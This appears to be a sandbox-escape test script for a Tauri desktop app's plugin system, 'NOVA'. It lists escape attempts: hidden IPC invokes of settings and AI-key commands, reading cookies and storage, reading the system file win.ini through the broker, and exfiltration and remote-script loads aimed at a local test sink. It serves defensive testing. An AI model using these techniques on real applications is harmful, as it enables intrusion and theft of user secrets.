// Tries to get out of the sandbox and writes down what happened through the one
// sanctioned door, the broker. A healthy NOVA blocks every attempt below.
// Everything that tries to leave aims here; the test counts what actually arrives.
const SINK = "http://127.0.0.1:8799";
const pending = new Map();
let nextId = 1;
addEventListener("message", (event) => {
  const message = event.data;
  if (message?.nova !== 1) return;
  if (message.event === "ping") parent.postMessage({ nova: 1, pong: 1 }, "*");
  if (message.id && pending.has(message.id)) {
    pending.get(message.id)(message);
    pending.delete(message.id);
  }
});
const call = (method, params) =>
  new Promise((resolve) => {
    const id = nextId++;
    pending.set(id, resolve);
    parent.postMessage({ nova: 1, id, method, params }, "*");
  });
const save = (key, value) => call("storage.set", { key, value: JSON.stringify(value) });
const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

parent.postMessage({ nova: 1, ready: true }, "*");

async function attempt(report, name, action) {
  try {
    const result = await Promise.race([Promise.resolve().then(action), wait(3000).then(() => "no answer")]);
    report[name] = `reached: ${String(typeof result === "object" ? JSON.stringify(result) : result).slice(0, 120)}`;
  } catch (error) {
    report[name] = `blocked: ${String(error).slice(0, 120)}`;
  }
}

async function attack() {
  const report = {
    "has __TAURI_INTERNALS__": typeof window.__TAURI_INTERNALS__,
    "has window.ipc": typeof window.ipc,
    "has chrome.webview": typeof window.chrome?.webview,
    "has window.__TAURI__": typeof window.__TAURI__,
  };
  const set = { key: "nova.hostile-invoke", value: '"reached"' };
  await attempt(report, "invoke settings_set", () => window.__TAURI_INTERNALS__.invoke("settings_set", set));
  await attempt(report, "invoke settings_get", () => window.__TAURI_INTERNALS__.invoke("settings_get", { key: "nova.settings" }));
  await attempt(report, "invoke ai_key_status", () => window.__TAURI_INTERNALS__.invoke("ai_key_status"));
  await attempt(report, "invoke files_recent", () => window.__TAURI_INTERNALS__.invoke("files_recent"));
  await attempt(report, "ipc.postMessage", () => window.ipc.postMessage(JSON.stringify({ cmd: "settings_set", callback: 1, error: 2, payload: { key: "nova.hostile-ipc", value: '"reached"' } })));
  await attempt(report, "chrome.webview.postMessage", () => window.chrome.webview.postMessage(JSON.stringify({ cmd: "settings_set", callback: 1, error: 2, payload: { key: "nova.hostile-webview", value: '"reached"' } })));
  await attempt(report, "fetch ipc.localhost", () => fetch("http://ipc.localhost/settings_set", { method: "POST", headers: { "Content-Type": "application/json", "Tauri-Callback": "1", "Tauri-Error": "2", "Tauri-Invoke-Key": "guess" }, body: JSON.stringify({ key: "nova.hostile-fetch", value: '"reached"' }) }).then((r) => r.status));
  await attempt(report, "fetch internet", () => fetch(`${SINK}/fetch`).then((r) => r.status));
  await attempt(report, "fetch own files", () => fetch("hostile.js").then((r) => r.status));
  await attempt(report, "websocket", () => new Promise((resolve, reject) => { const s = new WebSocket("ws://127.0.0.1:8799/websocket"); s.onopen = () => resolve("open"); s.onerror = () => reject(new Error("failed")); }));
  await attempt(report, "image to internet", () => new Promise((resolve, reject) => { const i = new Image(); i.onload = () => resolve("loaded"); i.onerror = () => reject(new Error("failed")); i.src = `${SINK}/image?secret=1`; }));
  await attempt(report, "parent DOM", () => window.parent.document.title);
  await attempt(report, "top DOM", () => window.top.document.title);
  await attempt(report, "localStorage", () => window.localStorage.getItem("nova.settings"));
  await attempt(report, "cookies", () => document.cookie);
  await attempt(report, "indexedDB", () => new Promise((resolve, reject) => { const r = indexedDB.open("x"); r.onsuccess = () => resolve("opened"); r.onerror = () => reject(new Error("failed")); }));
  await attempt(report, "window.open", () => { const w = window.open(`${SINK}/window-open`); if (!w) throw new Error("no window"); return "opened"; });
  await attempt(report, "eval", () => eval("1+1"));
  await attempt(report, "inline script", () => { const s = document.createElement("script"); s.textContent = "window.__inline = 1"; document.head.append(s); if (window.__inline !== 1) throw new Error("did not run"); return "ran"; });
  await attempt(report, "remote script", () => new Promise((resolve, reject) => { const s = document.createElement("script"); s.src = `${SINK}/script.js`; s.onload = () => resolve("loaded"); s.onerror = () => reject(new Error("failed")); document.head.append(s); }));
  await attempt(report, "sub frame", () => { const f = document.createElement("iframe"); f.src = `${SINK}/sub-frame`; document.body.append(f); return wait(1500).then(() => "tried"); });
  await attempt(report, "unknown broker method", async () => { const r = await call("files.read", { path: "C:/Windows/win.ini" }); if (r.error) throw new Error(r.error); return r.result; });
  await attempt(report, "broker without permission", async () => { const r = await call("system.snapshot", {}); if (r.error) throw new Error(r.error); return "got a snapshot"; });
  await attempt(report, "broker network", async () => { const r = await call("network.fetch", { url: "https://example.com/" }); if (r.error) throw new Error(r.error); return r.result; });
  await attempt(report, "broker analytics", async () => { const r = await call("analytics.get", { path: "live" }); if (r.error) throw new Error(r.error); return r.result; });
  await save("report", report);
  await save("done", true);

  // Last: try to leave. If NOVA blocks this, this script keeps running and says so.
  try {
    window.top.location.href = `${SINK}/top-navigation`;
  } catch {
    /* expected */
  }
  await wait(1500);
  await save("survived top navigation", true);
  location.href = `${SINK}/self-navigation`;
  await wait(2500);
  await save("survived self navigation", true);
}

function hang() {
  const until = Date.now() + 8000;
  while (Date.now() < until) {
    /* a plugin stuck in a loop */
  }
  void save("hang over", true);
}

const view = new URLSearchParams(location.search).get("view");
if (view === "page:hang") setTimeout(hang, 500);
else if (view === "page:attack") void attack();
